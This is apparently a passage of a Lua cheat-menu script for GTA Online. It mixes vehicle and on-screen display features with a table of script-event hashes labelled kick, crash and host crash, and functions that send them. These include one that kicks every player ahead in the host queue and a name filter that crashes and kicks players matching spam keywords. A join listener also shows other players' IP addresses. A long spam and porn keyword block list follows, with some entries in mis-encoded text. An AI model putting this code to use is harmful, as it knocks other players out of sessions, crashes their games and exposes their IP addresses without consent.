FUCK_VEHCAR = menu.add_feature("载具修复", "toggle", a.vehicleset.id,function(feat)
	Settings["FUCK_VEHCAR"] = true
	if feat.on then
		local myped = player.get_player_ped(player.player_id())
		if ped.is_ped_in_any_vehicle(myped) == true then
			local Curveh = ped.get_vehicle_ped_is_using(myped)
			vehicle.set_vehicle_fixed(Curveh)
			vehicle.set_vehicle_deformation_fixed(Curveh)
		end
		return HANDLER_CONTINUE
	end
	Settings["FUCK_VEHCAR"] = false
	return HANDLER_POP
end)
FUCK_VEHCAR.on = Settings["FUCK_VEHCAR"]	
	
auto_fz=menu.add_feature("自动翻转","toggle",a.vehicleset.id,function(a)
        while a.on do
		Settings["auto_fz"] = true
            system.yield(0)
            if player.is_player_in_any_vehicle(player.player_id()) then
                if entity.get_entity_rotation(player.get_player_vehicle(player.player_id())).y>=60 or entity.get_entity_rotation(player.get_player_vehicle(player.player_id())).y<=-60 or  entity.get_entity_rotation(player.get_player_vehicle(player.player_id())).x<=-160 or entity.get_entity_rotation(player.get_player_vehicle(player.player_id())).x>=160 then
                    entity.set_entity_rotation(player.get_player_vehicle(player.player_id()),v3(0,0,entity.get_entity_rotation(player.get_player_vehicle(player.player_id())).z))
                end
            end
        end
		Settings["auto_fz"] = false
    end)	
auto_fz.on = Settings["auto_fz"]

	getintotrain= c.df("进入火车/电车","action",a.vehicleset.id,function(k)
pedmy = player.get_player_ped(c.me())
veh = vehicle.get_all_vehicles()
for i = 1,#veh do
get_control_of_entity(veh[i], 300)
entityhash = entity.get_entity_model_hash(veh[i])
if entityhash == 868868440 then
ped.set_ped_into_vehicle(pedmy,veh[i],-1)
else
tx("附加没有电车",15,true)
end
c.wait(1)
if entityhash == 1030400667 then
ped.set_ped_into_vehicle(pedmy,veh[i],-1)
else
tx("附加没有火车",15,true)
end
end
end)

local load_chat_preset_1_default = io.open(rootPath.."\\scripts\\Candy\\Lua_Settings\\CustomChat\\Custom1.txt", "r")
local load_chat_preset_2_default = io.open(rootPath.."\\scripts\\Candy\\Lua_Settings\\CustomChat\\Custom2.txt", "r")
local load_chat_preset_3_default = io.open(rootPath.."\\scripts\\Candy\\Lua_Settings\\CustomChat\\Custom3.txt", "r")
local load_chat_preset_4_default = io.open(rootPath.."\\scripts\\Candy\\Lua_Settings\\CustomChat\\Custom4.txt", "r")
local load_chat_preset_5_default = io.open(rootPath.."\\scripts\\Candy\\Lua_Settings\\CustomChat\\Custom5.txt", "r")
local chat_preset_1_default = load_chat_preset_1_default:read("*a")
local chat_preset_2_default = load_chat_preset_2_default:read("*a")
local chat_preset_3_default = load_chat_preset_3_default:read("*a")
local chat_preset_4_default = load_chat_preset_4_default:read("*a")
local chat_preset_5_default = load_chat_preset_5_default:read("*a")
load_chat_preset_1_default:close()
load_chat_preset_2_default:close()
load_chat_preset_3_default:close()
load_chat_preset_4_default:close()
load_chat_preset_5_default:close()

zhuji = menu.add_feature("显示选项","parent",a.qita.id,function()
end)

show_notice = menu.add_feature("日志显示","parent",zhuji.id,function()
end)

_U_show_notice=menu.add_feature('显示日志','toggle',show_notice.id,function(a)
        if a.on then
            if utils.file_exists(utils.get_appdata_path("PopstarDevs", "").."\\2Take1Menu\\notification.log") then
                while a.on do
                    system.yield(0)
                    _U_noticed_x=0
                    _U_notice_msgs={}
                    notice_file=io.open(utils.get_appdata_path("PopstarDevs", "").."\\2Take1Menu\\notification.log",'r')
                    for i in notice_file:lines() do
                        _U_notice_msgs[#_U_notice_msgs+1]=i
                    end
                    for i=#_U_notice_msgs,1,-1 do
                        if #_U_notice_msgs<=_U_show_notice_max.value or #_U_notice_msgs-i<=_U_show_notice_max.value then
                            ui.draw_rect(0.001, 0.999, 4.5, 0.085, 0, 0, 0, 0)
                            ui.set_text_color(_U_show_notice_r.value, _U_show_notice_g.value, _U_show_notice_b.value,255)	
                            ui.set_text_scale(_U_show_notice_size.value*0.01)
                            ui.set_text_font(1)
                            ui.set_text_centre(false)
                            ui.set_text_outline(true)
                            ui.draw_text(_U_notice_msgs[i],v2(_U_show_notice_x.value*0.01,_U_show_notice_y.value*0.01+0.02*_U_noticed_x))
                            _U_noticed_x=_U_noticed_x+1
                        end
                    end
                    notice_file:close()
                    notice_file=nil
                end
            else
                notice_file=nil
                menu.notify('请打开2T本体的记录功能')
                a.on=false
            end
        else
            if notice_file then
                notice_file:close()
                notice_file=nil
            end
        end
    end)
_U_show_notice.on = Settings["_U_show_notice"]

notice1231111111= menu.add_feature("[如果启用显示日志游戏掉帧]", "action",show_notice.id,function(feat)
end)

notice1231114561= menu.add_feature("[请点下方的清空LOG]", "action",show_notice.id,function(feat)
end)

_U_delete_log=menu.add_feature('清空LOG','action',show_notice.id,function()
        local aa=_U_show_notice.on
        if aa then
            _U_show_notice.on=false
        end
        io.open(utils.get_appdata_path("PopstarDevs", "").."\\2Take1Menu\\notification.log",'w')
        if aa then
            _U_show_notice.on=true
        end
    end)

_U_lisen=menu.add_feature('111','toggle',show_notice.id,function(a)
        while a.on do
            system.yield(0)
            if not _U_show_notice.on and notice_file then
                notice_file:close()
                notice_file=nil
            end
        end
    end)
_U_lisen.hidden=true

_U_lisen.on=true

_U_show_notice_x=menu.add_feature('X','action_value_i',show_notice.id)
_U_show_notice_y=menu.add_feature('Y','action_value_i',show_notice.id)
_U_show_notice_size=menu.add_feature('大小','action_value_i',show_notice.id)
_U_show_notice_r=menu.add_feature('[R]','action_value_i',show_notice.id)
_U_show_notice_g=menu.add_feature('[G]','action_value_i',show_notice.id)
_U_show_notice_b=menu.add_feature('[B]','action_value_i',show_notice.id)
_U_show_notice_max=menu.add_feature('显示数量','action_value_i',show_notice.id)
_U_show_notice_x.max,_U_show_notice_x.min,_U_show_notice_x.mod=100,0,1
_U_show_notice_y.max,_U_show_notice_y.min,_U_show_notice_y.mod=100,0,1
_U_show_notice_x.value = Settings["_U_show_notice_x"]
_U_show_notice_y.value = Settings["_U_show_notice_y"]
_U_show_notice_r.max,_U_show_notice_r.min,_U_show_notice_r.mod=255,0,1
_U_show_notice_g.max,_U_show_notice_g.min,_U_show_notice_g.mod=255,0,1
_U_show_notice_b.max,_U_show_notice_b.min,_U_show_notice_b.mod=255,0,1
_U_show_notice_r.value = Settings["_U_show_notice_r"]
_U_show_notice_g.value = Settings["_U_show_notice_g"]
_U_show_notice_b.value = Settings["_U_show_notice_b"]
_U_show_notice_max.max,_U_show_notice_max.min,_U_show_notice_max.mod=50,0,1
_U_show_notice_max.value = Settings["_U_show_notice_max"]
_U_show_notice_size.max,_U_show_notice_size.min,_U_show_notice_size.mod=30,0,1
_U_show_notice_size.value = Settings["_U_show_notice_size"]

mcxh=1
mcr=255
mcg=0
mcb=0
show_script_name = menu.add_feature("脚本名字","toggle", zhuji.id, function(k)
	if k.on then
	Settings["Rockstars"] = true
		if mcxh==1 and mcg<256 then
			ui.set_text_color(mcr, mcg, mcb, 255)	
			if mcg == 255 then
				mcxh=2
			else
				mcg=mcg+1
			end
		elseif mcxh==2 and mcr>-1 then
			ui.set_text_color(mcr,mcg,mcb,255)
			if mcr == 0 then
				mcxh=3
			else
				mcr=mcr-1
			end
		elseif mcxh==3 and mcb<256 then
			ui.set_text_color(mcr,mcg,mcb,255)
			if mcb == 255 then
				mcxh=4
			else
				mcb=mcb+1
			end
		elseif mcxh==4 and mcg>-1 then
			ui.set_text_color(mcr,mcg,mcb,255)
			if mcg == 0 then
				mcxh=5
			else
				mcg=mcg-1
			end
		elseif mcxh==5 and mcr<256 then
			ui.set_text_color(mcr,mcg,mcb,255)
			if mcr == 255 then
				mcxh=6
			else
				mcr=mcr+1
			end
		elseif mcxh==6 and mcb>-1 then
			ui.set_text_color(mcr,mcg,mcb,255)
			if mcb == 0 then
				mcxh=1
			else
				mcb=mcb-1
			end
		end				
		ui.set_text_scale(0.56)
		ui.set_text_font(1)
		ui.set_text_centre(true)
		ui.set_text_outline(true)
		--ui.draw_text("¦∑\n ~h~<i>I Love Candy ",v2(0.5,0.03))
		ui.draw_text("~h~<i> I Love Candy ∑",v2(0.5,0.03))
		ui.set_text_font(1)
		return HANDLER_CONTINUE
	end
	Settings["Rockstars"] = false
end)

show_script_name.on = Settings["Rockstars"]

players_Join =menu.add_feature("玩家加入通知","toggle",zhuji.id,function(feat)
if feat.on then
pljoinevent =event.add_event_listener("player_join",function(p)
local Joinrid = player.get_player_scid(p.player)
local Joinname = player.get_player_name(p.player)  
local Joinip = intToIp(player.get_player_ip(p.player))  
menu.notify("ID: "..Joinname.. "\nRID: "..Joinrid ..  "\nIP: "..Joinip.."","",3, RGBAToInt(0, 255, 255, 255)) 
end)
else
event.remove_event_listener("player_join", pljoinevent)
end
return HANDLER_POP
end)
players_Join.on = Settings["players_Join"]

my_speed1 = menu.add_feature("当前时速", "toggle", zhuji.id, function(feat) 
while feat.on do
Settings["dangqianshisu"] = true
local pos = v2()
pos.x = .905
pos.y =  0.8600001
local ent
local ent1 = player.get_player_ped(player.player_id())	
local ent2 = ped.get_vehicle_ped_is_using(player.get_player_ped(player.player_id()))				
if ped.is_ped_in_any_vehicle(ent1) then ent = ent2 else ent = ent1 end
local speed = entity.get_entity_speed(ent)
local speedcalc = speed * 3.6
local speedcalcm =  speed * 2.236936
myspeed1 = math.ceil(speedcalc)
myspeed2 = math.ceil(speedcalcm)		
ui.set_text_scale(1.00)
ui.set_text_font(4)
ui.set_text_color(0, 0, 0, 255)
ui.set_text_centre(false)
ui.set_text_outline(1)
ui.draw_text(myspeed1 .." Km/h" , pos)
pos.x = .905
pos.y =  0.860001
ui.set_text_scale(1.00)
ui.set_text_font(4)
ui.set_text_color(255, 255, 255, 255)
ui.set_text_centre(false)
ui.set_text_outline(1)
ui.draw_text(myspeed1 .." Km/h", pos)
return HANDLER_CONTINUE
end
Settings["dangqianshisu"] = false
end)

my_speed1.on = Settings["dangqianshisu"]

sjxx1 = menu.add_feature("现实时间", "toggle",zhuji.id, function(feat)
local r,g,b=math.random(0,255),math.random(0,255),math.random(0,255)
while feat.on do
Settings["xianshishijian2"] = true
system.wait(0)
local Timee = os.time()
local Timee2 = (os.date('%A  %Y/%m/%d  %H:%M:%S', Timee))
local pos = v2()
pos.x = (0.5)
pos.y = (0.1) 
ui.set_text_scale(0.55)
ui.set_text_font(4)
ui.set_text_centre(1)
ui.set_text_outline(0)
ui.set_text_color(r,g,b, 255)
ui.draw_text(Timee2, pos)
end
Settings["xianshishijian2"] = false
return HANDLER_CONTINUE
end)
sjxx1.on = true
sjxx1.on = Settings["xianshishijian2"]

gametime = menu.add_feature("游戏时间", "toggle",zhuji.id, function(feat)
local r,g,b=math.random(0,255),math.random(0,255),math.random(0,255)
while feat.on do
    system.wait(0)
    local Time1 = time.get_clock_hours()
    local Time2 = time.get_clock_minutes()
    local lTime1 = string.len(Time1)
    local lTime2 = string.len(Time2)
    local Time11 = tostring(Time1)
    local Time22 = tostring(Time2)
    if lTime1 > 1 and lTime2 > 1 then
    ui.set_text_color(r,g,b, 255)
    ui.set_text_scale(0.5) 
    ui.set_text_font(4) 
    ui.set_text_centre(1) 
    ui.set_text_outline(0)
    ui.draw_text(Time11..":"..Time22, v2(0.8,0))
    elseif lTime1 < 2 and lTime2 > 1 then
    ui.set_text_color(r,g,b, 255)
    ui.set_text_scale(0.5)
    ui.set_text_font(4)
    ui.set_text_centre(1)
    ui.set_text_outline(0)
    ui.draw_text("0"..Time11..":"..Time22, v2(0.6,0))
    elseif lTime1 > 1 and lTime2 < 2 then
    ui.set_text_color(r,g,b, 255)
    ui.set_text_scale(0.5)
    ui.set_text_font(4)
    ui.set_text_centre(1)
    ui.set_text_outline(0)
    ui.draw_text(Time11..":0"..Time22, v2(0.6,0))
    elseif lTime1 < 2 and lTime2 < 2 then
    ui.set_text_color(r,g,b, 255)
    ui.set_text_scale(0.5)
    ui.set_text_font(4)
    ui.set_text_centre(1)
    ui.set_text_outline(0)
    ui.draw_text("0"..Time11..":0"..Time22, v2(0.6,0))
    end
end
return HANDLER_CONTINUE
end)
gametime.on = Settings["gametime"]

sjxx2 = c.df("同步现实时间", "toggle",zhuji.id, function(feat)
if feat.on then 
local osh, osm, oss = os.date("%H"), os.date("%M"), os.date("%S")
time.set_clock_time(osh, osm, oss)
c.wait(0)
return HANDLER_CONTINUE
else
return HANDLER_POP 
end
end)

bool_host = false
host_tips = menu.add_feature("主机/脚本主机提示", "toggle", zhuji.id, function(feat) 
if feat.on then
bool_host = true
return HANDLER_CONTINUE
else
bool_host = false
return HANDLER_CONTINUE
end
return HANDLER_POP
end)
host_tips.on = true
host_tips.hidden = true

inviciamountint = 0
inviciamountintt = 0
inviciamountinttt = ""
zhujixulie_weizhii = v2()
zhujixulie_weizhii1 = v2()
zhujixulie_weizhii2 = v2()
zhujixulie_weizhii3 = v2()
zhujixulie_weizhii4 = v2()
zhujixulie_weizhii5 = v2()
zhujixulie_weizhii6 = v2()
zhujixulie_weizhii7 = v2()
zhujixulie_weizhi_XX = 0.17
zhujixulie_weizhi_YY = 0.77

invicamountloop = menu.add_feature("loop", "toggle", zhuji.id, function(f)
    if f.on then
        inviciamountint = 0
        for pid = 0, 31 do
            if player.is_player_valid(pid) then
                pped = player.get_player_ped(pid)
                if pped ~= 0 then
                    if (player.is_player_god(pid) or player.is_player_vehicle_god(pid)) and interior.get_interior_from_entity(pped) == 0 then
                        inviciamountint = inviciamountint + 1
                    end
                end
            end
        end
        inviciamountintt = inviciamountint
        return HANDLER_CONTINUE
    end
end)
invicamountloop.hidden = true

suduzhenceloop = menu.add_feature("loop", "toggle", zhuji.id, function(feat)
	while feat.on do
        local myentityy
        local myentityy1 = player.get_player_ped(player.player_id())	
        local myentityy2 = ped.get_vehicle_ped_is_using(player.get_player_ped(player.player_id()))
        if ped.is_ped_in_any_vehicle(myentityy1) then
            myentityy = myentityy2
        else
            myentityy = myentityy1
        end
        local myyyspeed = entity.get_entity_speed(myentityy)
        local speedcalcuuuu = myyyspeed * 3.6
        myspeedddd1 = math.ceil(speedcalcuuuu)
		return HANDLER_CONTINUE
	end
end)
suduzhenceloop.hidden = true
suduzhenceloop.on = true





zhujixulie_weizhi_YY = Settings["zhujixulie_weizhi_YY"]


my_map_name = menu.add_feature("玩家栏", "parent", zhuji.id, function()
end)
map_name_type = v2()
bool_strar = 0

strarS_x_type = 0.01
strarS_y_type = 0.01

map_name_strat = menu.add_feature("开启", "toggle", my_map_name.id, function(feat) 
	if feat.on then
		Settings["mingchengzhanshi"] = true
		if (bool_strar == 0) then				
		map_name_type.x = strarS_x_type
		map_name_type.y = strarS_y_type
		elseif (bool_strar == 1)
		then
		map_name_type.x = 0.0001
		map_name_type.y = 0.000001
		end	
		for pid = 0, 32 do
			if player.get_player_ped(pid) ~= 0 then
				local name = player.get_player_name(pid)
				local isYou = player.player_id() == pid
				local playercolor = {{255,255,255}, {255, 0, 0}, {255, 0, 255}, {0, 255, 255}}
				ui.set_text_color(playercolor[1][1], playercolor[1][2], playercolor[1][3], 255)				
				if player.is_player_god(pid) and not player.is_player_modder(pid,-1) then
					ui.set_text_color(playercolor[2][1], playercolor[2][2], playercolor[2][3], 255)
				end
				if player.is_player_god(pid) and player.is_player_modder(pid,-1) then
					ui.set_text_color(playercolor[3][1], playercolor[3][2], playercolor[3][3], 255)					
				end
				if player.is_player_modder(pid,-1) and not player.is_player_god(pid) then
					ui.set_text_color(255, 170, 0, 255)
				end
				if player.is_player_friend(pid) then
					ui.set_text_color(0, 255, 0, 255)
				end
				if isYou then
					ui.set_text_color(0, 255, 255, 255)
				end
				if (bool_strar == 0) then		
					if map_name_type.y > (strarS_y_type + 0.27) then
						map_name_type.x = strarS_x_type + 0.07
						map_name_type.y = strarS_y_type
					else
					end
				elseif (bool_strar == 1)
				then
					if map_name_type.x > 0.95 then
						map_name_type.y = .015
						map_name_type.x = 0.0001
					else
					end
				end
				ui.set_text_scale(0.35)
				ui.set_text_font(4)				
				ui.set_text_centre(false)
				ui.set_text_outline(true)		
				if player.is_player_friend(pid) then
				    name = name.."[F]"
				elseif 
				player.get_player_wanted_level(pid)~=0 then
                    name=name..'~b~['..tostring(player.get_player_wanted_level(pid)).. ']'
                elseif
				player.is_player_modder(pid,-1) and player.is_player_host(pid) and pid == script.get_host_of_this_script() then
					name = name.."[MHS]"
				elseif
				player.is_player_modder(pid,-1) and player.is_player_host(pid) then
					name = name.."[MH]"
				elseif 
				player.is_player_modder(pid,-1) and not player.is_player_host(pid) and pid == script.get_host_of_this_script() then
					name = name.."[MS]"
				elseif
				player.is_player_host(pid) and pid ~= script.get_host_of_this_script() then
					name = name.."[H]"
				elseif 
				pid == script.get_host_of_this_script() and not player.is_player_host(pid) then
					name = name.."[S]"
				elseif 
				player.is_player_host(pid) and pid == script.get_host_of_this_script() then
					name = name.."[HS]"
				elseif 
				player.is_player_modder(pid,-1) and not player.is_player_host(pid) and pid ~= script.get_host_of_this_script() then
					name = name.."[M]"
				end				
				ui.draw_text(" " .. name .. " ", map_name_type)
				if (bool_strar == 0) then
					map_name_type.y = map_name_type.y + 0.017
				elseif (bool_strar == 1)
				then
					map_name_type.x = map_name_type.x + 0.067
				end
			end
		end		
		return HANDLER_CONTINUE
	else
		Settings["mingchengzhanshi"] = false
	end
end)
map_name_strat.on = Settings["mingchengzhanshi"]


strarV = menu.add_feature("横版展示", "toggle", my_map_name.id, function(feat) 
	if feat.on then
	Settings["mingchengzhanshihengban"] = true
	bool_strar = 1
	return HANDLER_CONTINUE
	else
	Settings["mingchengzhanshihengban"] = false
	end
end)
strarV.on = Settings["mingchengzhanshihengban"]

local script_event_hashes = {
    ["Netbail kick"] = 2092565704,
    ["Kick 1"] = 1964309656,
    ["Kick 2"] = 696123127,
    ["Kick 3"] = 43922647,
    ["Kick 4"] = 600486780,
    ["Kick 5"] = 1954846099,
    ["Kick 6"] = 153488394,
    ["Kick 7"] = 1249026189,
    ["Kick 8"] = 515799090,
    ["Kick 9"] = 1463355688,
    ["Kick 10"] = -1382676328,
    ["Kick 11"] = 1256866538,
    ["Kick 12"] = 515799090,
    ["Kick 13"] = -1813981910,
    ["Kick 14"] = 202252150,
    ["Kick 15"] = -19131151,
    ["Kick 16"] = -635501849,
    ["Kick 17"] = 1964309656,
    ["Crash 1"] = -988842806,
    ["Crash 2"] = -2043109205,
    ["Crash 3"] = 1926582096,
    ["Crash 4"] = 153488394,
    ["Script host crash 1"] = 315658550,
    ["Script host crash 2"] = -877212109,
    ["Disown personal vehicle"] = -2072214082,
    ["Vehicle EMP"] = 975723848,
    ["Destroy personal vehicle"] = 1229338575,
    ["Kick out of vehicle"] = -1005623606,
    ["Remove wanted level"] = 1187364773,
    ["Give OTR or ghost organization"] = -397188359,
    ["Block passive"] = 1472357458,
    ["Send to mission"] = -1147284669,
    ["Send to Perico island"] = -1479371259,
    ["Apartment invite"] = 1249026189,
    ["CEO ban"] = 1355230914,
    ["Dismiss or terminate from CEO"] = -316948135,
    ["Insurance notification"] = 299217086,
    ["Transaction error"] = -2041535807,
    ["CEO money"] = 1152266822,
    ["Bounty"] = -1906146218,
    ["Banner"] = 1659915470,
    ["Sound 1"] = 1537221257,
    ["Sound 2"] = -1162153263,
    ["Bribe authorities"] = -151720011
}	

function get_script_event_hash(name)
    local hash = script_event_hashes[name]
    if math.type(hash) == "integer" then
        return hash
    else
        return 0
    end
end

function generic_player_global(pid)
    return script.get_global_i(1893548 + (1 + (pid * 600) + 511))
end

function get_people_in_front_of_person_in_host_queue()
    if network.network_is_host() then
        return {}, {}
    end
    local hosts, friends = {}, {}
    local player_host_priority = player.get_player_host_priority(player.player_id())
    for pid = 0, 31 do
        if player.is_player_valid(pid) and pid ~= player.player_id() then
            if player.get_player_host_priority(pid) <= player_host_priority or player.is_player_host(pid) then
                hosts[#hosts + 1] = pid
                if network.is_scid_friend(player.get_player_scid(pid)) then
                    friends[#friends + 1] = pid
                end
            end
        end
    end
    return hosts, friends
end

local SE_send_limiter = {}
function send_script_event(name, pid, args, friend_condition)
    if player.is_player_valid(pid) and pid ~= player.player_id() then
        if math.type(pid) == "integer" then 
            for i = 1, #args do
                if math.type(args[i]) ~= "integer" then
                    return
                end
            end
        else
            return
        end
        repeat
            local temp = {}
            for i = 1, #SE_send_limiter do
                if SE_send_limiter[i] > utils.time_ms() then
                    temp[#temp + 1] = SE_send_limiter[i]
                end
            end
            SE_send_limiter = temp
            if #temp >= 10 then
                system.yield(0)
            end
        until #temp < 10
        if player.is_player_valid(pid) then
            SE_send_limiter[#SE_send_limiter + 1] = utils.time_ms() + (1 // gameplay.get_frame_time())
            script.trigger_script_event(get_script_event_hash(name), pid, args)
        end
    else
        system.yield(0)
    end
end

function get_host()
    local hosts = get_people_in_front_of_person_in_host_queue()
    for i, pid in pairs(hosts) do
        send_script_event("Netbail kick", pid, {pid, generic_player_global(pid)})
        for x=0,17 do
            send_script_event("Kick "..tostring(x), pid, {pid, generic_player_global(pid)})
        end
    end
    return {}, false
end

local key_words={
    "乱伦",
    "加微信就送2000w",
    "淘宝平台下单",
    "Q.Q",
    "vx",
    "网址进入",
	"封号包赔",
	"科技群",
	"淘宝店铺",
    "q.q",
	"你也是这个网站买的吗？",
	"还在为钱而烦恼吗",
	"刷金",
	"日本女优",
	"购买地址",
	"你把我关笼子里干嘛",
	"麻豆传媒",
	"无限天基炮",
	"刚更新完游戏好卡",
	"千人售后",
	"GTA5免费辅助",
	"加威信GTA",
	"随意奔放使用",
	"今日特惠",
	"跨战局追杀",
	"各种外挂",
	"信誉老店",
	"本群可带各种任务",
	"加入我们修仙联盟成功逆袭改",
	"您还在为钱而烦恼吗",
	"另有优惠辅助卖",
	"免费科技的加群",
	"按T查看",
	"顶级制裁科技",
	"萌新一起玩 做任务",
	"国外专业团队",
	"安全又稳定",
	"科技官网",
	"在线观看",
	"卖淫",
	"元一亿",
	"代刷",
	"刷钱低价",
	"裙",
	";",
	"官网",
    "v.x",
    "shua",
    "Shua",
    "SHUA",
    "SHUa",
    "sHUA",
    "微信",
    "威信",
    "萌新一起玩",
    "信用保障",
    "安全稳定",
    "解锁",
    "解所",
    "Q群",
    "q群",
    "全网最低",
    "全往最低",
    "店铺",
    "激情大片",
    "澳门赌场",
    "抠逼自慰",
    "加群",
	"线上任务科技开黑群",
    "刷钱",
    "淘宝",
    "十年店铺",
    "支持花呗",
	"四年老店",
	"国产自拍",
	"老牌辅助",
	"线上组队任务",
	"免费辅助",
	"丝袜美腿",
	"淘宝平台下单",
    "限定车辆",
	"地堡刷金",
	"全网独家稳定不封",
	"微",
	"轰炸战局",
    "有妹子",
    "扣群",
    "扣扣",
    "Î¢ÐÅ",
    "ÍþÐÅ",
	"大哥买挂吗？",
	"刷金币",
    "ÃÈÐÂÒ»ÆðÍæ",
    "ÐÅÓÃ±£ÕÏ",
    "°²È«ÎÈ¶¨",
    "½âËø",
    "½âËù",
    "QÈº",
    "qÈº",
    "È«Íø×îµÍ",
    "È«Íù×îµÍ",
    "µêÆÌ",
    "¼¤Çé´óÆ¬",
    "°ÄÃÅ¶Ä³¡",
    "¿Ù±Æ×ÔÎ¿",
    "¼ÓÈº",
    "Ë¢Ç®",
    "ÌÔ±¦",
    "Ê®ÄêµêÆÌ",
    "Ö§³Ö»¨ßÂ",
    "µØ±¤Ë¢½ð",
    "ÓÐÃÃ×Ó",
    "¿ÛÈº",
    "¿Û¿Û",
    "Е�®Д©ӯ",
    "Е�ғД©ӯ",
    "ХҚҲФ–°Д�қХӢ·ГҶ�",
    "Д©ӯГ”�Д©�И��",
    "Е®‰Е…�Г�ЁЕ®�",
    "Х§ёИ”ғ",
    "Х§ёФ‰қ",
    "QГ�¤",
    "qГ�¤",
    "Е…�Г�‘Ф�қД�Ҷ",
    "Е…�Е�қФ�қД�Ҷ",
    "Е�—И“�",
    "Ф©қФҒ…Е¤§Г‰‡",
    "Ф�ЁИ—�ХӢҲЕ��",
    "Фҳ�Иқ�Х‡�Ф…°",
    "Еҳ�Г�¤",
    "Е�·И’±",
    "Ф·�Е®�",
    "ЕҷғЕ№�Е�—И“�",
    "Ф”�ФҲғХҳ±Е‘—",
    "Е�°Е�ӯЕ�·И‡‘",
    "Ф�‰Е¦№Е­Қ",
    "Ф‰ёГ�¤",
    "Ф‰ёФ‰ё",
    "寰�淇�",
    "濞佷俊",
    "钀屾柊涓€璧风帺",
    "淇＄敤淇濋殰",
    "瀹夊叏绋冲畾",
    "瑙ｉ攣",
    "瑙ｆ墍",
    "Q缇�",
    "q缇�",
    "鍏ㄧ綉鏈€浣�",
    "鍏ㄥ線鏈€浣�",
    "搴楅摵",
    "婵€鎯呭ぇ鐗�",
    "婢抽棬璧屽満",
    "鎶犻€艰嚜鎱�",
    "鍔犵兢",
    "鍒烽挶",
    "娣樺疂",
    "鍗佸勾搴楅摵",
    "鏀�鎸佽姳鍛�",
    "鍦板牎鍒烽噾",
    "鏈夊�瑰瓙",
    "鎵ｇ兢",
    "鎵ｆ墸",
    "ๅพฎไฟก",
    "ๅจ�ไฟก",
   "��ๆ–ฐไธ€่ตท็�ฉ",
   "ไฟก็”จไฟ�้��",
   "ๅฎ�ๅ…จ็จณๅฎ�",
   "งฃ้”�",
   "งฃๆ�€",
   "Q็พค",
   "q็พค",
    "ๅ…จ็ฝ‘ๆ�€ไฝ�",
    "ๅ…จๅพ€ๆ�€ไฝ�",
    "ๅบ—้“บ",
    "ๆฟ€ๆ�…ๅคง็��",
    "ๆพณ้—จ่ต�ๅ�บ",
    "ๆ� ้€ผ่�ชๆ…ฐ",
    "ๅ� ็พค",
    "ๅ�ท้’ฑ",
    "ๆท�ๅฎ�",
    "ๅ��ๅนดๅบ—้“บ",
    "ๆ”ฏๆ��่�ฑๅ‘—",
    "ๅ�ฐๅ กๅ�ท้�‘",
    "ๆ��ๅฆนๅญ�",
    "ๆ�ฃ็พค",
    "ๆ�ฃๆ�ฃ",
    ".com",
    ".cn",
    ".cc",
    ".xyz",
    ".top",
    ".us",
    ".ru",
    ".net",
    ".ad",
    ".ae",
    ".wang",
    ".pub",
    ".xin",
    ".cc",
    ".tv",
    ".uk",
    ".org",
    ".jp",
    ".edu",
    ".gov",
    ".mil",
    ".online",
    "ltd",
    ".shop",
    ".beer",
    ".art",
    ".luxe",
    ".co",
    ".vip",
    ".club",
    ".fun",
    ".tech",
    ".store",
    ".red",
    ".pro",
    ".kim",
    ".ink",
    ".group",
    ".work",
    ".ren",
    ".biz",
    ".mobi",
    ".site",
    ".asia",
    ".law",
    ".me",
    ".COM",
    ".CN",
    ".CC",
    ".XYZ",
    ".TOP",
    ".US",
    ".RU",
    ".NET",
    ".AD",
    ".AE",
    ".WANG",
    ".PUB",
    ".XIN",
    ".CC",
    ".TV",
    ".UK",
    ".ORG",
    ".JP",
    ".EDU",
    ".GOV",
    ".MIL",
    ".ONLINE",
    ".LTD",
    ".SHOP",
    ".BEER",
    ".ART",
    ".LUXE",
    ".CO",
    ".VIP",
    ".CLUB",
    ".FUN",
    ".TECH",
    ".STORE",
    ".RED",
    ".PRO",
    ".KIM",
    ".INK",
    ".GROUP",
    ".WORK",
    ".REN",
    ".BIZ",
    ".MOBI",
    ".SITE",
    ".ASIA",
    ".LAW",
    ".ME",
    ".cloud",
    ".love",
    ".press",
    ".space",
    ".video",
    ".fit",
    ".yoga",
    ".info",
    ".design",
    ".link",
    ".live",
    ".wiki",
    ".life",
    ".world",
    ".run",
    ".show",
    ".city",
    ".gold",
    ".today",
    ".plus",
    ".cool",
    ".icu",
    ".company",
    ".chat",
    ".zone",
    ".fans",
    ".host",
    ".center",
    ".email",
    ".fund",
    ".social",
    ".team",
    ".guru",
    ".CLOUD",
    ".LOVE",
    ".PRESS",
    ".SPACE",
    ".VIDEO",
    ".FIT",
    ".YOGA",
    ".INFO",
    ".DESIGN",
    ".LINK",
    ".LIVE",
    ".WIKI",
    ".LIFE",
    ".WORLD",
    ".RUN",
    ".SHOW",
    ".CITY",
    ".GOLD",
	"；",
	":",
    ".TODAY",
    ".PLUS",
    ".COOL",
    ".ICU",
    ".COMPANY",
    ".CHAT",
    ".ZONE",
    ".FANS",
    ".HOST",
    ".CENTER",
    ".EMAIL",
    ".FUND",
    ".SOCIAL",
	".中国",
	".我爱你",
	"购买菜单",
    ".TEAM",
    ".GURU"
}

local key_words_name={
    "shua",
    "Shua",
    "SHua",
    "SHUa",
    "sHua",
	"SHUA",
    "sHUa",
    "sHUA",
    "shUa",
    "ShUA",
    "shuA",
    "coin",
    "Coin",
    "COin",
    "COIn",
    "COIN",
    "cOin",
	"Black",
    "cOIn",
    "cOIN",
    "Qq",
    "qQ",
    "qq",
    "VX",
    "vx",
    "Vx",
    "vX",
    "Qqun",
    "qQun",
    "q_qun",
    "q_Qun",
    "Q_Qun",
    "Q_QUN",
    "QUN_",
    "qun_",
	"Black",
    "Qun_"
}

local user_name_trial=menu.add_feature("检测玩家名字","toggle",adlanjie123.id,function(a)
        if a.on then
            user_name_trial_id=event.add_event_listener("player_join",function(b)
                local pid=b.player
                local player_name=player.get_player_name(pid)            
                for i=1,#key_words_name do
                    if player_name:match("%"..key_words_name[i]) and player.is_player_friend(pid) and pid~=player.player_id() then
                      menu.notify("检测到类似广告机昵称 "..player.get_player_name(pid).."\nRID:"..player.get_player_scid(pid).. "IP:"..intToIp(player.get_player_ip(pid)),"", 3, RGBAToInt(0, 255, 227, 255))
                        if player.is_player_valid(pid) then
                            for x=1,4 do
                                send_script_event("Crash "..tostring(x), pid, {pid, generic_player_global(pid)})
                            end
                        end
                        if player.is_player_valid(pid) then
                            network.network_session_kick_player(pid)
                            send_script_event("Netbail kick", pid, {pid, generic_player_global(pid)})
                        end
                        if player.is_player_valid(pid) then
                            for x=1,14 do
                                send_script_event("Kick "..tostring(x), pid, {pid, generic_player_global(pid)})
